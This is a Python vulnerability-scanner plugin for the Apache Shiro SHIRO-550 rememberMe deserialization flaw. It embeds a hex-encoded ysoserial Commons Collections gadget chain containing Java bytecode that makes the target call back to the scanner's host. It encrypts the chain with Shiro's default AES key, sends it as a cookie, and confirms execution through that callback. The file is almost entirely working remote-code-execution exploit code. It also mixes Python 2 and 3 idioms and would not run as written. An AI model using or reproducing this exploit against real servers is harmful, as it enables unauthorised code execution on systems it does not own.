#!/usr/bin/env python
#-*- coding: utf-8 -*-
import urllib.request
import ssl
import socket
import base64
import random
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def get_plugin_info():
	plugin_info = {
		"name": "SHIRO-550 反序列化漏洞",
		"info": "漏洞的成因是Apache Commons Collections (ACC) 3.2.1及4.0版本未能正确验证用户输入，其InvokerTransformer类在反序列化来自可疑域的数据时存在安全漏洞，这可使攻击者在用户输入中附加恶意代码并组合运用不同类的readObject()方法，在最终类型检查之前执行Java函数或字节码（包括调用Runtime.exec()执行本地OS命令）。",
		"level": "紧急",
		"type": "代码执行",
		"author": "Dee Ng<d33.n99@gmail.com>",
		"url": "https://issues.apache.org/jira/browse/SHIRO-550",
		"keyword": "banner:shiro",
		"source": 1
	}
	return plugin_info

def random_str(len):
	str1 = ""
	for i in range(len):
		str1 += (random.choice("ABCDEFGH1234567890"))
	return str(str1)

def get_ver_ip(ip):
	csock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	csock.connect((ip, 80))
	(addr, port) = csock.getsockname()
	csock.close()
	return addr	

def check(ip, port, timeout):
	dnsserver = get_ver_ip(ip)
	random_num = random_str(6 + 15 - len(dnsserver))
	payload = "aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b787000000002737200426f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73342e636f6d70617261746f72732e5472616e73666f726d696e67436f6d70617261746f722ff984f02bb108cc0200024c00096465636f726174656471007e00014c000b7472616e73666f726d657274002d4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e73342f5472616e73666f726d65723b7870737200406f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73342e636f6d70617261746f72732e436f6d70617261626c65436f6d70617261746f72fbf49925b86eb13702000078707372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73342e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000e6e65775472616e73666f726d6572757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007704000000037372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c61737371007e000b4c00055f6e616d6571007e000a4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000002757200025b42acf317f8060854e0020000787000000689cafebabe0000003100370a0003002207003507002507002601001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c756505ad2093f391ddef3e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010013537475625472616e736c65745061796c6f616401000c496e6e6572436c61737365730100354c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f61643b0100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a457863657074696f6e730700270100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07002801003379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f6164010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a6176612f696f2f53657269616c697a61626c65010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01001f79736f73657269616c2f7061796c6f6164732f7574696c2f476164676574730100083c636c696e69743e01000c6a6176612f6e65742f55524c07002a010026687474703a2f2f3235352e3235352e3235352e3235353a383038382f6164642f72616e646f6d08002c010015284c6a6176612f6c616e672f537472696e673b29560c000a002e0a002b002f01000a6f70656e53747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0c003100320a002b003301001d79736f73657269616c2f50776e6572323230373432333535323632323701001f4c79736f73657269616c2f50776e657232323037343233353532363232373b002100020003000100040001001a000500060001000700000002000800040001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000002e000e0000000c000100000005000f003600000001001300140002000c0000003f0000000300000001b100000002000d00000006000100000033000e00000020000300000001000f0036000000000001001500160001000000010017001800020019000000040001001a00010013001b0002000c000000490000000400000001b100000002000d00000006000100000037000e0000002a000400000001000f003600000000000100150016000100000001001c001d000200000001001e001f00030019000000040001001a00080029000b0001000c0000001f0004000200000013a70003014cbb002b59122db70030b6003457b1000000000002002000000002002100110000000a000100020023001000097571007e0018000001d4cafebabe00000031001b0a0003001507001707001807001901001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75650571e669ee3c6d47180100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010003466f6f01000c496e6e6572436c61737365730100254c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f3b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07001a01002379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f0100106a6176612f6c616e672f4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501001f79736f73657269616c2f7061796c6f6164732f7574696c2f47616467657473002100020003000100040001001a000500060001000700000002000800010001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000003b000e0000000c000100000005000f001200000002001300000002001400110000000a000100020016001000097074000450776e727077010078737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b02000078700000000178"
	payload = payload.decode('hex').replace('http://255.255.255.255:8088/add/random', ('http://%s:8088/add/%s' % (dnsserver, random_num)))
	pad = lambda s: s + ((16 - len(s) % 16) * chr(16 - len(s) % 16)).encode()
	cipher = Cipher(algorithms.AES(base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")),modes.CBC("1111111111111111"),backend=default_backend())
	encryptor = cipher.encryptor()
	final_payload = base64.b64encode("1111111111111111" + encryptor.update(pad(payload)))
	header = {'cookie': ("rememberMe=%s" % final_payload.decode())}

	try:
		request = urllib.request.Request(('http://%s:%d' % (ip, port)), headers=header)
		res_html = urllib.request.urlopen(request, timeout=timeout).read()
	except:pass
	try:
		ctx = ssl.create_default_context()
		ctx.check_hostname = False
		ctx.verify_mode = ssl.CERT_NONE
		request = urllib.request.Request(('https://%s:%d' % (ip, port)), headers=header)
		res_html = urllib.request.urlopen(request, context=ctx, timeout=timeout).read()
	except:pass

	time.sleep(5)
	req = urllib.request.Request("http://%s:8088/check/%s" % (dnsserver, random_num))
	reqopen = urllib.request.urlopen(req)
	if 'YES' in reqopen.read():return u"存在SHIRO-550反序列化漏洞"
	return
